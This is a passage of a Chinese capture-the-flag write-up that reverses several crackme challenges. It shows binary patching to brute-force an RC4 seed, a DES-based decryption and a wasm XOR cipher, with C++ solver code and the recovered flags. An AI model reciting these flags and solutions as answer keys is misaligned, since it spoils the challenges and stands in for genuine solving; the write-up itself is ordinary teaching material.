<p><img src="/images/1744633170178-24.png" alt="img" loading="lazy"></p>
<p>开始Patch原程序流程，用于爆破，将init函数作为hook跳转函数。</p>
<p>将rand调用改成jmp到init函数。</p>
<p><img src="/images/1744633170178-25.png" alt="img" loading="lazy"></p>
<p>init函数头直接改成如下，将0x4068D3地址的数值存到eax，然后再跳转回去，达到一个hook修改rand值结果的效果，所以我们直接加载elf通过修改0x4068D3数值，调用rc4加密来爆破解密密文。</p>
<p><img src="/images/1744633170178-26.png" alt="img" loading="lazy"></p>
<p>这边使用这个库加载elf进行调用call：<a target="_blank" rel="noopener" href="https://github.com/IchildYu/load-elf">https://github.com/IchildYu/load-elf</a> （河豚鱼，神）</p>
<p>爆破代码（Key是在原init函数中进行初始化的明文，可以直接找到）：</p>
<pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &quot;include&#x2F;load_elf.h&quot;
#include &quot;include&#x2F;logger.h&quot;
#include &quot;include&#x2F;breakpoint.h&quot;

int main() 
&#123;
        const char* path &#x3D; &quot;.&#x2F;conforand&quot;;
        void* base &#x3D; load_elf(path);

        __uint64_t  (*rc4)(unsigned char*, unsigned long long, unsigned char*, unsigned long long) &#x3D; get_symbol_by_offset(base,0x413170);

        unsigned char key[]&#x3D;&quot;JustDoIt!&quot;;

        for(int i&#x3D;0; i&lt;1000000; i++)
        &#123;
                unsigned char EncData[]&#x3D;&#123;0x83,0x1e,0x9c,0x48,0x7a,0xfa,0xe8,0x88,0x36,0xd5,0x0a,0x08,0xf6,0xa7,0x70,0x0f,0xfd,0x67,0xdd,0xd4,0x3c,0xa7,0xed,0x8d,0x51,0x10,0xce,0x6a,0x9e,0x56,0x57,0x83,0x56,0xe7,0x67,0x9a,0x67,0x22,0x24,0x6e,0xcd,0x2f&#125;;

                *(unsigned int*)(0x4068D3) &#x3D; i;

                rc4(EncData,42,key,9);
                
                if(EncData[0] &#x3D;&#x3D; &#39;H&#39; 
                        &amp;&amp; EncData[1] &#x3D;&#x3D; &#39;Z&#39;
                        &amp;&amp; EncData[2] &#x3D;&#x3D; &#39;N&#39;)
                &#123;
                        printf(&quot;Seed:%d\n&quot;,i);
                        printf(&quot;%.42s\n&quot;,EncData);
                        break;
                &#125;
        &#125;
        return 0;
&#125;</code></pre>

<p><img src="/images/1744633170178-27.png" alt="img" loading="lazy"></p>
<p>HZNUCTF{489b88-1305-411e-b1f4-88a3070a73}</p>
<h3 id="exchange"><a href="#exchange" class="headerlink" title="exchange"></a>exchange</h3><p>输入的字符串经过unhex、拆分字节，改变顺序。</p>
<p>如：<strong>11</strong>-&gt;<strong>0x31 0x31</strong>-&gt;<strong>‘3’ ‘1’ ‘3’ ‘1’</strong>-&gt;<strong>‘3’ ‘3’ ‘1’ ‘1’</strong></p>
<p>是两个字节为一组进行变换的。</p>
<p>然后调用了加密函数，第一个参数传入变换后的输入，第二个参数是**”HZNUCTF{“**字串。</p>
<p><img src="/images/1744633170178-28.png" alt="img" loading="lazy"></p>
<p>主加密函数，发现只走这上面的部分。</p>
<p><img src="/images/1744633170178-29.png" alt="img" loading="lazy"></p>
<p>第一个函数是用**”HZNUCTF{“**字串生成的一串数据，64个整数数据。</p>
<p>第二个函数是将输入数据8个字节为一组进行加密。</p>
<p>加密流程：</p>
<ol>
<li>4个字节为一组进行翻转</li>
<li>8字节加密</li>
<li>4个字节为一组进行翻转</li>
</ol>
<p><img src="/images/1744633170178-30.png" alt="img" loading="lazy"></p>
<p>加密可以看出是DES加密算法，是对称的，key就是刚刚生成的64个整数数值的前32个，那么可以知道后32个就是解密用的key，直接copy该函数，解密时用生成的后32个整数key即可解密。</p>
<p><img src="/images/1744633170178-31.png" alt="img" loading="lazy"></p>
<p>解密代码：</p>
<pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;
#include &lt;windows.h&gt;
#include &lt;string&gt;
#include &lt;time.h&gt;

unsigned int s1[64] &#x3D; &#123;
    0x01010400, 0x00000000, 0x00010000, 0x01010404, 0x01010004, 0x00010404, 0x00000004, 0x00010000,
    0x00000400, 0x01010400, 0x01010404, 0x00000400, 0x01000404, 0x01010004, 0x01000000, 0x00000004,
    0x00000404, 0x01000400, 0x01000400, 0x00010400, 0x00010400, 0x01010000, 0x01010000, 0x01000404,
    0x00010004, 0x01000004, 0x01000004, 0x00010004, 0x00000000, 0x00000404, 0x00010404, 0x01000000,
    0x00010000, 0x01010404, 0x00000004, 0x01010000, 0x01010400, 0x01000000, 0x01000000, 0x00000400,
    0x01010004, 0x00010000, 0x00010400, 0x01000004, 0x00000400, 0x00000004, 0x01000404, 0x00010404,
    0x01010404, 0x00010004, 0x01010000, 0x01000404, 0x01000004, 0x00000404, 0x00010404, 0x01010400,
    0x00000404, 0x01000400, 0x01000400, 0x00000000, 0x00010004, 0x00010400, 0x00000000, 0x01010004&#125;;
unsigned int s2[64] &#x3D; &#123;
    0x80108020, 0x80008000, 0x00008000, 0x00108020, 0x00100000, 0x00000020, 0x80100020, 0x80008020,
    0x80000020, 0x80108020, 0x80108000, 0x80000000, 0x80008000, 0x00100000, 0x00000020, 0x80100020,
    0x00108000, 0x00100020, 0x80008020, 0x00000000, 0x80000000, 0x00008000, 0x00108020, 0x80100000,
    0x00100020, 0x80000020, 0x00000000, 0x00108000, 0x00008020, 0x80108000, 0x80100000, 0x00008020,
    0x00000000, 0x00108020, 0x80100020, 0x00100000, 0x80008020, 0x80100000, 0x80108000, 0x00008000,
    0x80100000, 0x80008000, 0x00000020, 0x80108020, 0x00108020, 0x00000020, 0x00008000, 0x80000000,
    0x00008020, 0x80108000, 0x00100000, 0x80000020, 0x00100020, 0x80008020, 0x80000020, 0x00100020,
    0x00108000, 0x00000000, 0x80008000, 0x00008020, 0x80000000, 0x80100020, 0x80108020, 0x00108000&#125;;
unsigned int s3[64] &#x3D; &#123;
    0x00000208, 0x08020200, 0x00000000, 0x08020008, 0x08000200, 0x00000000, 0x00020208, 0x08000200,
    0x00020008, 0x08000008, 0x08000008, 0x00020000, 0x08020208, 0x00020008, 0x08020000, 0x00000208,
    0x08000000, 0x00000008, 0x08020200, 0x00000200, 0x00020200, 0x08020000, 0x08020008, 0x00020208,
    0x08000208, 0x00020200, 0x00020000, 0x08000208, 0x00000008, 0x08020208, 0x00000200, 0x08000000,
    0x08020200, 0x08000000, 0x00020008, 0x00000208, 0x00020000, 0x08020200, 0x08000200, 0x00000000,
    0x00000200, 0x00020008, 0x08020208, 0x08000200, 0x08000008, 0x00000200, 0x00000000, 0x08020008,
    0x08000208, 0x00020000, 0x08000000, 0x08020208, 0x00000008, 0x00020208, 0x00020200, 0x08000008,
    0x08020000, 0x08000208, 0x00000208, 0x08020000, 0x00020208, 0x00000008, 0x08020008, 0x00020200&#125;;
unsigned int s4[64] &#x3D; &#123;
    0x00802001, 0x00002081, 0x00002081, 0x00000080, 0x00802080, 0x00800081, 0x00800001, 0x00002001,
    0x00000000, 0x00802000, 0x00802000, 0x00802081, 0x00000081, 0x00000000, 0x00800080, 0x00800001,
    0x00000001, 0x00002000, 0x00800000, 0x00802001, 0x00000080, 0x00800000, 0x00002001, 0x00002080,
    0x00800081, 0x00000001, 0x00002080, 0x00800080, 0x00002000, 0x00802080, 0x00802081, 0x00000081,
    0x00800080, 0x00800001, 0x00802000, 0x00802081, 0x00000081, 0x00000000, 0x00000000, 0x00802000,
    0x00002080, 0x00800080, 0x00800081, 0x00000001, 0x00802001, 0x00002081, 0x00002081, 0x00000080,
    0x00802081, 0x00000081, 0x00000001, 0x00002000, 0x00800001, 0x00002001, 0x00802080, 0x00800081,
    0x00002001, 0x00002080, 0x00800000, 0x00802001, 0x00000080, 0x00800000, 0x00002000, 0x00802080&#125;;
unsigned int s5[64] &#x3D; &#123;
    0x00000100, 0x02080100, 0x02080000, 0x42000100, 0x00080000, 0x00000100, 0x40000000, 0x02080000,
    0x40080100, 0x00080000, 0x02000100, 0x40080100, 0x42000100, 0x42080000, 0x00080100, 0x40000000,
    0x02000000, 0x40080000, 0x40080000, 0x00000000, 0x40000100, 0x42080100, 0x42080100, 0x02000100,
    0x42080000, 0x40000100, 0x00000000, 0x42000000, 0x02080100, 0x02000000, 0x42000000, 0x00080100,
    0x00080000, 0x42000100, 0x00000100, 0x02000000, 0x40000000, 0x02080000, 0x42000100, 0x40080100,
    0x02000100, 0x40000000, 0x42080000, 0x02080100, 0x40080100, 0x00000100, 0x02000000, 0x42080000,
    0x42080100, 0x00080100, 0x42000000, 0x42080100, 0x02080000, 0x00000000, 0x40080000, 0x42000000,
    0x00080100, 0x02000100, 0x40000100, 0x00080000, 0x00000000, 0x40080000, 0x02080100, 0x40000100&#125;;
unsigned int s6[64] &#x3D; &#123;
    0x20000010, 0x20400000, 0x00004000, 0x20404010, 0x20400000, 0x00000010, 0x20404010, 0x00400000,
    0x20004000, 0x00404010, 0x00400000, 0x20000010, 0x00400010, 0x20004000, 0x20000000, 0x00004010,
    0x00000000, 0x00400010, 0x20004010, 0x00004000, 0x00404000, 0x20004010, 0x00000010, 0x20400010,
    0x20400010, 0x00000000, 0x00404010, 0x20404000, 0x00004010, 0x00404000, 0x20404000, 0x20000000,
    0x20004000, 0x00000010, 0x20400010, 0x00404000, 0x20404010, 0x00400000, 0x00004010, 0x20000010,
    0x00400000, 0x20004000, 0x20000000, 0x00004010, 0x20000010, 0x20404010, 0x00404000, 0x20400000,
    0x00404010, 0x20404000, 0x00000000, 0x20400010, 0x00000010, 0x00004000, 0x20400000, 0x00404010,
    0x00004000, 0x00400010, 0x20004010, 0x00000000, 0x20404000, 0x20000000, 0x00400010, 0x20004010&#125;;
unsigned int s7[64] &#x3D; &#123;
    0x00200000, 0x04200002, 0x04000802, 0x00000000, 0x00000800, 0x04000802, 0x00200802, 0x04200800,
    0x04200802, 0x00200000, 0x00000000, 0x04000002, 0x00000002, 0x04000000, 0x04200002, 0x00000802,
    0x04000800, 0x00200802, 0x00200002, 0x04000800, 0x04000002, 0x04200000, 0x04200800, 0x00200002,
    0x04200000, 0x00000800, 0x00000802, 0x04200802, 0x00200800, 0x00000002, 0x04000000, 0x00200800,
    0x04000000, 0x00200800, 0x00200000, 0x04000802, 0x04000802, 0x04200002, 0x04200002, 0x00000002,
    0x00200002, 0x04000000, 0x04000800, 0x00200000, 0x04200800, 0x00000802, 0x00200802, 0x04200800,
    0x00000802, 0x04000002, 0x04200802, 0x04200000, 0x00200800, 0x00000000, 0x00000002, 0x04200802,
    0x00000000, 0x00200802, 0x04200000, 0x00000800, 0x04000002, 0x04000800, 0x00000800, 0x00200002&#125;;
unsigned int s8[64] &#x3D; &#123;
    0x10001040, 0x00001000, 0x00040000, 0x10041040, 0x10000000, 0x10001040, 0x00000040, 0x10000000,
    0x00040040, 0x10040000, 0x10041040, 0x00041000, 0x10041000, 0x00041040, 0x00001000, 0x00000040,
    0x10040000, 0x10000040, 0x10001000, 0x00001040, 0x00041000, 0x00040040, 0x10040040, 0x10041000,
    0x00001040, 0x00000000, 0x00000000, 0x10040040, 0x10000040, 0x10001000, 0x00041040, 0x00040000,
    0x00041040, 0x00040000, 0x10041000, 0x00001000, 0x00000040, 0x10040040, 0x00001000, 0x00041040,
    0x10001000, 0x00000040, 0x10000040, 0x10040000, 0x10040040, 0x10000000, 0x00040000, 0x10001040,
    0x00000000, 0x10041040, 0x00040040, 0x10000040, 0x10040000, 0x10001000, 0x10001040, 0x00000000,
    0x10041040, 0x00041000, 0x00041000, 0x00001040, 0x00001040, 0x00040040, 0x10000000, 0x10041000&#125;;
unsigned short word_7FF65FC70900[8] &#x3D; &#123;
    0x0080, 0x0040, 0x0020, 0x0010, 0x0008, 0x0004, 0x0002, 0x0001&#125;;

unsigned int dword_7FF65FC70910[24] &#x3D; &#123;
    0x00800000, 0x00400000, 0x00200000, 0x00100000, 0x00080000, 0x00040000, 0x00020000, 0x00010000,
    0x00008000, 0x00004000, 0x00002000, 0x00001000, 0x00000800, 0x00000400, 0x00000200, 0x00000100,
    0x00000080, 0x00000040, 0x00000020, 0x00000010, 0x00000008, 0x00000004, 0x00000002, 0x00000001&#125;;
unsigned char byte_7FF65FC70970[56] &#x3D; &#123;
    0x38, 0x30, 0x28, 0x20, 0x18, 0x10, 0x08, 0x00, 0x39, 0x31, 0x29, 0x21, 0x19, 0x11, 0x09, 0x01,
    0x3A, 0x32, 0x2A, 0x22, 0x1A, 0x12, 0x0A, 0x02, 0x3B, 0x33, 0x2B, 0x23, 0x3E, 0x36, 0x2E, 0x26,
    0x1E, 0x16, 0x0E, 0x06, 0x3D, 0x35, 0x2D, 0x25, 0x1D, 0x15, 0x0D, 0x05, 0x3C, 0x34, 0x2C, 0x24,
    0x1C, 0x14, 0x0C, 0x04, 0x1B, 0x13, 0x0B, 0x03&#125;;
unsigned char byte_7FF65FC709A8[16] &#x3D; &#123;
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10&#125;;

void __fastcall des_encrypt(unsigned int *a1, DWORD *a2)
&#123;
    unsigned int left &#x3D; a1[1];
    unsigned int right &#x3D; a1[0];

    unsigned int temp &#x3D; (left ^ (right &gt;&gt; 4)) &amp; 0xF0F0F0F;
    left &#x3D; temp ^ left;
    right &#x3D; (temp &lt;&lt; 4) ^ right;

    temp &#x3D; (left ^ (right &gt;&gt; 16)) &amp; 0x0000FFFF;
    left &#x3D; temp ^ left;
    right &#x3D; (temp &lt;&lt; 16) ^ right;

    temp &#x3D; (right ^ (left &gt;&gt; 2)) &amp; 0x33333333;
    right &#x3D; temp ^ right;
    left &#x3D; (temp &lt;&lt; 2) ^ left;

    temp &#x3D; (right ^ (left &gt;&gt; 8)) &amp; 0x00FF00FF;
    right &#x3D; temp ^ right;
    left &#x3D; (((temp &lt;&lt; 8) ^ left) &gt;&gt; 31) | (2 * ((temp &lt;&lt; 8) ^ left));

    temp &#x3D; (left ^ right) &amp; 0xAAAAAAAA;
    left &#x3D; temp ^ left;
    right &#x3D; ((temp ^ right) &gt;&gt; 31) | (2 * (temp ^ right));

    for (int i &#x3D; 0; i &lt; 8; i++)
    &#123;
        temp &#x3D; *a2++ ^ ((left &gt;&gt; 4) | (left &lt;&lt; 28));
        unsigned int result1 &#x3D; s1[(temp &gt;&gt; 24) &amp; 0x3F] |
                               s3[(temp &gt;&gt; 16) &amp; 0x3F] |
                               s5[(temp &gt;&gt; 8) &amp; 0x3F] |
                               s7[temp &amp; 0x3F];
        temp &#x3D; *a2++ ^ left;

        right ^&#x3D; s2[(temp &gt;&gt; 24) &amp; 0x3F] |
                 s4[(temp &gt;&gt; 16) &amp; 0x3F] |
                 s6[(temp &gt;&gt; 8) &amp; 0x3F] |
                 s8[temp &amp; 0x3F] |
                 result1;

        temp &#x3D; *a2++ ^ ((right &gt;&gt; 4) | (right &lt;&lt; 28));
        result1 &#x3D; s1[(temp &gt;&gt; 24) &amp; 0x3F] |
                  s3[(temp &gt;&gt; 16) &amp; 0x3F] |
                  s5[(temp &gt;&gt; 8) &amp; 0x3F] |
                  s7[temp &amp; 0x3F];

        temp &#x3D; *a2++ ^ right;
        left ^&#x3D; s2[(temp &gt;&gt; 24) &amp; 0x3F] |
                s4[(temp &gt;&gt; 16) &amp; 0x3F] |
                s6[(temp &gt;&gt; 8) &amp; 0x3F] |
                s8[temp &amp; 0x3F] |
                result1;
    &#125;
    left &#x3D; (left &gt;&gt; 1) | (left &lt;&lt; 31);
    temp &#x3D; (left ^ right) &amp; 0xAAAAAAAA;
    left &#x3D; temp ^ left;
    right &#x3D; ((temp ^ right) &gt;&gt; 1) | ((temp ^ right) &lt;&lt; 31);

    temp &#x3D; (left ^ (right &gt;&gt; 8)) &amp; 0xFF00FF;
    left &#x3D; temp ^ left;
    right &#x3D; (temp &lt;&lt; 8) ^ right;

    temp &#x3D; (left ^ (right &gt;&gt; 2)) &amp; 0x33333333;
    left &#x3D; temp ^ left;
    right &#x3D; (temp &lt;&lt; 2) ^ right;

    temp &#x3D; (right ^ (left &gt;&gt; 16)) &amp; 0xFFFF;
    right &#x3D; temp ^ right;
    left &#x3D; (temp &lt;&lt; 16) ^ left;

    temp &#x3D; (right ^ (left &gt;&gt; 4)) &amp; 0x0F0F0F0F;

    a1[0] &#x3D; (temp &lt;&lt; 4) ^ left;
    a1[1] &#x3D; temp ^ right;
&#125;

int main()
&#123;
    unsigned int key[64] &#x3D; &#123;
        0x2C0B3C36, 0x09221A0A, 0x2829051D, 0x09123B0D, 0x2C091B18, 0x0512011F, 0x09292E17, 0x07122920,
        0x090D1703, 0x0514372E, 0x0915123C, 0x27100E27, 0x01050927, 0x25150D29, 0x13151F32, 0x24112618,
        0x03052031, 0x34312B37, 0x13043A05, 0x3C19151B, 0x23063B3E, 0x34293830, 0x03062108, 0x380B3F2A,
        0x260E063D, 0x3009141B, 0x0E223D3D, 0x300B0124, 0x062A1700, 0x11093D14, 0x0E22262B, 0x1208083E,
        0x0E22262B, 0x1208083E, 0x062A1700, 0x11093D14, 0x0E223D3D, 0x300B0124, 0x260E063D, 0x3009141B,
        0x03062108, 0x380B3F2A, 0x23063B3E, 0x34293830, 0x13043A05, 0x3C19151B, 0x03052031, 0x34312B37,
        0x13151F32, 0x24112618, 0x01050927, 0x25150D29, 0x0915123C, 0x27100E27, 0x090D1703, 0x0514372E,
        0x09292E17, 0x07122920, 0x2C091B18, 0x0512011F, 0x2829051D, 0x09123B0D, 0x2C0B3C36, 0x09221A0A&#125;;

    unsigned int data[64] &#x3D; &#123;
        0x00000084, 0x0000008B, 0x00000003, 0x00000022, 0x00000014, 0x000000BE, 0x000000DF, 0x00000075,
        0x000000B3, 0x000000D5, 0x00000076, 0x0000006F, 0x000000CD, 0x0000002A, 0x0000005D, 0x000000D7,
        0x0000004D, 0x000000B2, 0x0000005F, 0x00000006, 0x00000098, 0x0000009D, 0x0000003E, 0x000000A8,
        0x000000F7, 0x00000023, 0x000000F2, 0x0000008B, 0x000000F2, 0x00000054, 0x00000065, 0x0000007A,
        0x00000020, 0x000000C0, 0x00000087, 0x00000055, 0x000000D6, 0x0000003B, 0x00000046, 0x0000003D,
        0x000000F7, 0x000000B2, 0x0000007A, 0x0000009D, 0x000000C2, 0x000000CF, 0x0000001A, 0x000000AE,
        0x00000016, 0x000000C7, 0x00000015, 0x00000030, 0x0000008E, 0x000000FD, 0x0000008F, 0x0000009E,
        0x000000AA, 0x00000039, 0x000000AB, 0x000000FE, 0x00000095, 0x000000A7, 0x0000001F, 0x000000F1&#125;;

    unsigned char Enc[64]&#123;&#125;;
    for (int i &#x3D; 0; i &lt; 64; i++)
        Enc[i] &#x3D; data[i];

    &#x2F;&#x2F; 四字节一组翻转
    for (int i &#x3D; 0; i &lt; 64; i +&#x3D; 4)
    &#123;
        auto a &#x3D; Enc[i], b &#x3D; Enc[i + 1], c &#x3D; Enc[i + 2], d &#x3D; Enc[i + 3];
        Enc[i] &#x3D; d;
        Enc[i + 1] &#x3D; c;
        Enc[i + 2] &#x3D; b;
        Enc[i + 3] &#x3D; a;
    &#125;
    
    &#x2F;&#x2F; DES解密（用后32个key）
    for (int i &#x3D; 0; i &lt; 64; i +&#x3D; 8)
        des_encrypt((unsigned int *)(Enc + i), (DWORD *)(key + 32));

    &#x2F;&#x2F; 四字节一组翻转
    for (int i &#x3D; 0; i &lt; 64; i +&#x3D; 4)
    &#123;
        auto a &#x3D; Enc[i], b &#x3D; Enc[i + 1], c &#x3D; Enc[i + 2], d &#x3D; Enc[i + 3];
        Enc[i] &#x3D; d;
        Enc[i + 1] &#x3D; c;
        Enc[i + 2] &#x3D; b;
        Enc[i + 3] &#x3D; a;
    &#125;

    printf(&quot;HZNUCTF&#123;&quot;);
    &#x2F;&#x2F; 逆向初始字符串变换
    for (int i &#x3D; 0; i &lt; 64; i +&#x3D; 4)
    &#123;
        std::string tmp1;
        tmp1 +&#x3D; Enc[i];
        tmp1 +&#x3D; Enc[i + 2];

        std::string tmp2;
        tmp2 +&#x3D; Enc[i + 1];
        tmp2 +&#x3D; Enc[i + 3];

        printf(&quot;%c&quot;, char(std::stoi(tmp1, 0, 16)));
        printf(&quot;%c&quot;, char(std::stoi(tmp2, 0, 16)));
    &#125;

    printf(&quot;&#125;\n&quot;);

    return 0;
&#125;</code></pre>

<p>HZNUCTF{391ds2b9-9e31-45f8-ba4a-4904a2d8}</p>
<h3 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h3><p>下载附件发现wasm文件开头字节和正常wasm文件不一样，复制修复即可。</p>
<p>左题目附件，右正常wasm文件。</p>
<p><img src="/images/1744633170178-32.png" alt="img" loading="lazy"></p>
<p>使用ghidra进行分析，因为有专门的wasm反编译插件。</p>
<p>通过Exports定位到main函数，以下是经过我重命名后的结果。</p>
<p><img src="/images/1744633170178-33.png" alt="img" loading="lazy"></p>
<p>首先是输入key，然后判断和该处明文是否相等。</p>
<p>然后将Key xor上0x51。</p>
<p><img src="/images/1744633170178-34.png" alt="img" loading="lazy"></p>
<p><img src="/images/1744633170178-35.png" alt="img" loading="lazy"></p>
<p>第一步加密，置了随机数种子0x194，然后用随机数打乱输入的字符串，再转存到另一个Out数组。</p>
<p><img src="/images/1744633170178-36.png" alt="img" loading="lazy"></p>
<p><img src="/images/1744633170179-37.png" alt="img" loading="lazy"></p>
<p>第二步加密（四个字节一组加密）：</p>
<ol>
<li>用key获取到两个值，然后全局数值iRam0001120++，每次加密都+1，初始值是0。</li>
<li>调用一个函数将0x10ea0处数据异或上0x10da0取下标的对应值。</li>
<li>再将输入字符串异或上0x10ea0对应下标数据以及0x11020对应下标数据，0x11020处数据就是原Key字符串**”TGCTF404”**。</li>
</ol>
<p><img src="/images/1744633170179-38.png" alt="img" loading="lazy"></p>
<p><img src="/images/1744633170179-39.png" alt="img" loading="lazy"></p>
<p>最后再与0x10fa0处数据进行比对，所以0x10fa0处就是加密后的flag。</p>
<p><img src="/images/1744633170179-40.png" alt="img" loading="lazy"></p>
<p>导出0x10ea0和0x10da0数据，编写以上代码的逆向解密代码即可。</p>
<p>解密代码：</p>
<pre class="language-C++" data-language="C++"><code class="language-C++">#include &lt;iostream&gt;
#include &lt;Windows.h&gt;

&#x2F;&#x2F; 0x10da0处数据
unsigned char box[] &#x3D; &#123;
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5,
    0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0,
    0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc,
    0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a,
    0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0,
    0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b,
    0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85,
    0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5,
    0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17,
    0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88,
    0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c,
    0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9,
    0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6,
    0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e,
    0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94,
    0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68,
    0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16&#125;;
    
&#x2F;&#x2F; 0x10ea0处数据
unsigned char box_ori[] &#x3D; &#123;
    0xd6, 0x90, 0xe9, 0xfe, 0xcc, 0xe1, 0x3d, 0xb7, 0x16, 0xb6, 0x14, 0xc2, 0x28, 0xfb, 0x2c, 0x05,
    0x2b, 0x67, 0x9a, 0x76, 0x2a, 0xbe, 0x04, 0xc3, 0xaa, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99,
    0x9c, 0x42, 0x50, 0xf4, 0x91, 0xef, 0x98, 0x7a, 0x33, 0x54, 0x0b, 0x43, 0xed, 0xcf, 0xac, 0x62,
    0xe4, 0xb3, 0x1c, 0xa9, 0xc9, 0x08, 0xe8, 0x95, 0x80, 0xdf, 0x94, 0xfa, 0x75, 0x8f, 0x3f, 0xa6,
    0x47, 0x07, 0xa7, 0xfc, 0xf3, 0x73, 0x17, 0xba, 0x83, 0x59, 0x3c, 0x19, 0xe6, 0x85, 0x4f, 0xa8,
    0x68, 0x6b, 0x81, 0xb2, 0x71, 0x64, 0xda, 0x8b, 0xf8, 0xeb, 0x0f, 0x4b, 0x70, 0x56, 0x9d, 0x35,
    0x1e, 0x24, 0x0e, 0x5e, 0x63, 0x58, 0xd1, 0xa2, 0x25, 0x22, 0x7c, 0x3b, 0x01, 0x21, 0x78, 0x87,
    0xd4, 0x00, 0x46, 0x57, 0x9f, 0xd3, 0x27, 0x52, 0x4c, 0x36, 0x02, 0xe7, 0xa0, 0xc4, 0xc8, 0x9e,
    0xea, 0xbf, 0x8a, 0xd2, 0x40, 0xc7, 0x38, 0xb5, 0xa3, 0xf7, 0xf2, 0xce, 0xf9, 0x61, 0x15, 0xa1,
    0xe0, 0xae, 0x5d, 0xa4, 0x9b, 0x34, 0x1a, 0x55, 0xad, 0x93, 0x32, 0x30, 0xf5, 0x8c, 0xb1, 0xe3,
    0x1d, 0xf6, 0xe2, 0x2e, 0x82, 0x66, 0xca, 0x60, 0xc0, 0x29, 0x23, 0xab, 0x0d, 0x53, 0x4e, 0x6f,
    0xd5, 0xdb, 0x37, 0x45, 0xde, 0xfd, 0x8e, 0x2f, 0x03, 0xff, 0x6a, 0x72, 0x6d, 0x6c, 0x5b, 0x51,
    0x8d, 0x1b, 0xaf, 0x92, 0xbb, 0xdd, 0xbc, 0x7f, 0x11, 0xd9, 0x5c, 0x41, 0x1f, 0x10, 0x5a, 0xd8,
    0x0a, 0xc1, 0x31, 0x88, 0xa5, 0xcd, 0x7b, 0xbd, 0x2d, 0x74, 0xd0, 0x12, 0xb8, 0xe5, 0xb4, 0xb0,
    0x89, 0x69, 0x97, 0x4a, 0x0c, 0x96, 0x77, 0x7e, 0x65, 0xb9, 0xf1, 0x09, 0xc5, 0x6e, 0xc6, 0x84,
    0x18, 0xf0, 0x7d, 0xec, 0x3a, 0xdc, 0x4d, 0x20, 0x79, 0xee, 0x5f, 0x3e, 0xd7, 0xcb, 0x39, 0x48&#125;;
    
void unnamed_function_10(byte *param1, int param2)
&#123;
    for (int i &#x3D; 0; i &lt; 0x100; i &#x3D; i + 1)
    &#123;
        param1[i] &#x3D; param1[i] ^ (byte)param2;
    &#125;
    return;
&#125;

unsigned char Enc[] &#x3D; &#123;
    0x84, 0x00, 0x00, 0x00,
    0x1c, 0x00, 0x00, 0x00,
    0x6b, 0x00, 0x00, 0x00,
    0xf7, 0x00, 0x00, 0x00,
    0x49, 0x00, 0x00, 0x00,
    0x22, 0x00, 0x00, 0x00,
    0xd6, 0x00, 0x00, 0x00,
    0x42, 0x00, 0x00, 0x00,
    0x50, 0x00, 0x00, 0x00,
    0x7b, 0x00, 0x00, 0x00,
    0x42, 0x00, 0x00, 0x00,
    0xf4, 0x00, 0x00, 0x00,
    0x46, 0x00, 0x00, 0x00,
    0xa9, 0x00, 0x00, 0x00,
    0x83, 0x00, 0x00, 0x00,
    0x62, 0x00, 0x00, 0x00,
    0xd1, 0x00, 0x00, 0x00,
    0x32, 0x00, 0x00, 0x00,
    0x80, 0x00, 0x00, 0x00,
    0x42, 0x00, 0x00, 0x00,
    0x6a, 0x00, 0x00, 0x00,
    0x10, 0x00, 0x00, 0x00,
    0xa3, 0x00, 0x00, 0x00,
    0xf2, 0x00, 0x00, 0x00,
    0xe2, 0x00, 0x00, 0x00,
    0xb8, 0x00, 0x00, 0x00,
    0x0b, 0x00, 0x00, 0x00,
    0x76, 0x00, 0x00, 0x00,
    0xb0, 0x00, 0x00, 0x00,
    0xdc, 0x00, 0x00, 0x00,
